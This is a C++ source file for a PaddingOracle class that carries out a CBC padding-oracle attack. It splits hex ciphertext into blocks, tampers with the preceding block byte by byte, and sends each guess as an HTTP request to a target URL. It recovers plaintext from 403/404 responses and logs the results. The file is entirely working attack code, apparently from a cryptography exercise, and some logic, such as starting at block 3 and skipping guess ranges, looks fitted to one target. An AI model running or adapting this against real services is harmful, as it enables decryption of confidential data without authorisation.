

#include "paddingoracle.hpp"
#include <charconv>
#include <sstream>
#include <iomanip>
#include <limits>

#define LOG(s) BOOST_LOG_SEV(mLoggerChannel, s)
using namespace boost::log::trivial;


PaddingOracle::PaddingOracle() :
  mLoggerChannel(Logger::getInstance().addChannel("MESSAGE"))
{

}


void PaddingOracle::setCipherText(std::string_view aCtx)
{
  splitCipherText(aCtx);
}


namespace {
  constexpr uint CHARS_IN_BLOCK = 32;
}


void PaddingOracle::splitCipherText(std::string_view aCtx)
{
  for (auto i=0; i<aCtx.length(); i+=2) {
    int byte;
    if (auto [p, ec] = std::from_chars(aCtx.data()+i, aCtx.data()+i+2, byte, 16);
        ec == std::errc()) {
      uint blkIndex = i/CHARS_IN_BLOCK;
      uint pos = i%CHARS_IN_BLOCK/2; 
      if (mMsgBlocks.size() <= blkIndex) {
          mMsgBlocks.emplace_back(Block{});
      }
        mMsgBlocks.at(blkIndex).at(pos) = static_cast<std::byte>(byte);
    }
  }

  for (auto& b : mMsgBlocks) {
    LOG(severity_level::debug) << "msg block:";
    printBlock(b);
  }
}



template<typename... Args>
std::string PaddingOracle::buildMsg(Args...aMsgs){
  return (blockToString(aMsgs) + ...);
}


std::string PaddingOracle::buildMsg(Block& aPrevCtx, size_t aCtxIdx){
  std::stringstream ss;
  for (size_t i=0; i<= aCtxIdx; ++i) {
    if (i == (aCtxIdx-1)) {
      ss << blockToString(aPrevCtx);
    } else {
      ss << blockToString(mMsgBlocks.at(i));
    }
  }
  return ss.str();
}


void PaddingOracle::paddingAttack()
{
  for (size_t i=3; i<mMsgBlocks.size(); ++i) {
    if (i == (mMsgBlocks.size()-1)) {
      decryptLastBlock(i-1, i);
    } else {
      decryptBlock(i-1, i);
    }
  }
}


void PaddingOracle::decryptBlock(size_t aPrevCtxIdx, size_t aCtxIdx)
{
  LOG(severity_level::info) << "-------------------------- MSG BLOCK " << aCtxIdx << " --------------------------";
  Block pt;
  for (int i = 15; i>=0; --i) {
    auto prevCtx = mMsgBlocks.at(aPrevCtxIdx);
    fillPadding(i, prevCtx, pt);
    auto val = guessValue(i, prevCtx, aCtxIdx);
    pt.at(i) = val;
  }

  LOG(severity_level::info) << __FUNCTION__ << " result: " << blockToString(pt);
  std::string txt = reinterpret_cast<char*>(pt.data());
  txt.resize(pt.size());
  LOG(severity_level::info) << __FUNCTION__ << " plain: " << txt;
  plainText.push_back(pt);
}


void PaddingOracle::decryptLastBlock(size_t aPrevCtxIdx, size_t aCtxIdx)
{
  LOG(severity_level::info) << "-------------------------- LAST MSG BLOCK " << aCtxIdx << " --------------------------";
  LOG(severity_level::info) << blockToString(mMsgBlocks.at(aPrevCtxIdx));
  Block pt;

  for (int i = 0; i<16; ++i) {
    auto prevCtx = mMsgBlocks.at(aPrevCtxIdx);
    prevCtx.at(i) ^= prevCtx.at(i);
    auto err = paddingAttackRequest(prevCtx, aCtxIdx);
    if (err == http::ErrorCode::HTTP_403_FORBIDDEN) {
      LOG(severity_level::info) << "====================================================================";
      LOG(severity_level::info) << " Found padding " <<  16 - i;
      LOG(severity_level::info) << "====================================================================";
      LOG(severity_level::info) << " Fill plain text block with the real padding ";
      for (int j=i; j<16; ++j) {
        pt.at(j) = (std::byte)(16 - i);
      }
      LOG(severity_level::info) << blockToString(pt);
      LOG(severity_level::info) << " Continue guessing at " << i - 1;
      for (int k = i-1; k>=0; --k) {
        prevCtx = mMsgBlocks.at(aPrevCtxIdx);
        fillPadding(k, prevCtx, pt);
        auto val = guessValue(k, prevCtx, aCtxIdx);
        pt.at(k) = val;
      }
      break;
    }

  }

  LOG(severity_level::info) << __FUNCTION__ << " result: " << blockToString(pt);
  std::string txt = reinterpret_cast<char*>(pt.data());
  txt.resize(pt.size());
  LOG(severity_level::info) << __FUNCTION__ << " plain: " << txt;
  plainText.push_back(pt);
}


void PaddingOracle::fillPadding(size_t aIndex, Block& aCtx, Block aPlainTxt)
{
  auto pv = static_cast<std::byte>(16 - aIndex);
  for (int i = 15; i>aIndex; --i) {
    aCtx.at(i) = aCtx.at(i) ^ aPlainTxt.at(i) ^ pv;
  }
}



std::byte PaddingOracle::guessValue(size_t aIndex, Block& aPrevCtx, size_t aCtxIdx)
{
  auto pv = static_cast<std::byte>(16 - aIndex);
  for (int g = std::numeric_limits<uint8_t>::min() + 32;
        g <= std::numeric_limits<uint8_t>::max(); ++g) {
    auto prvCtx = aPrevCtx;
    prvCtx.at(aIndex) = prvCtx.at(aIndex) ^ static_cast<std::byte>(g) ^ pv;
    LOG(severity_level::debug) << "Guess: " << g;
    auto err = paddingAttackRequest(prvCtx, aCtxIdx);
    if (err == http::ErrorCode::HTTP_404_NOT_FOUND) {
      LOG(severity_level::info) << "====================================================================";
      LOG(severity_level::info) << " Found at index " <<  aIndex << " : " << static_cast<int>(g);
      LOG(severity_level::info) << "====================================================================";
      return static_cast<std::byte>(g);
    }
    if (g==32) {
      g = 64;
    }
  }

  return static_cast<std::byte>(0);
}


http::ErrorCode PaddingOracle::paddingAttackRequest(Block& aPrevCtx, size_t aCtxIdx)
{
  auto retCode = http::ErrorCode::Unknown;
  mHttpClient.request(http::Method::GET,
    mUrl + buildMsg(aPrevCtx, aCtxIdx),
    [&retCode](auto aData, auto aErrCode) { retCode = aErrCode; }
  );

  return retCode;
}


std::string PaddingOracle::blockToString(const Block& aBlock) const
{
  std::stringstream ss;
  for (auto& b : aBlock) {
    ss << std::right << std::setfill('0') << std::setw(2)
        << std::hex << std::to_integer<uint>(b);
  }
  return ss.str();
}


void PaddingOracle::printBlock(const Block& aBlock)
{
  LOG(severity_level::debug) << blockToString(aBlock);
}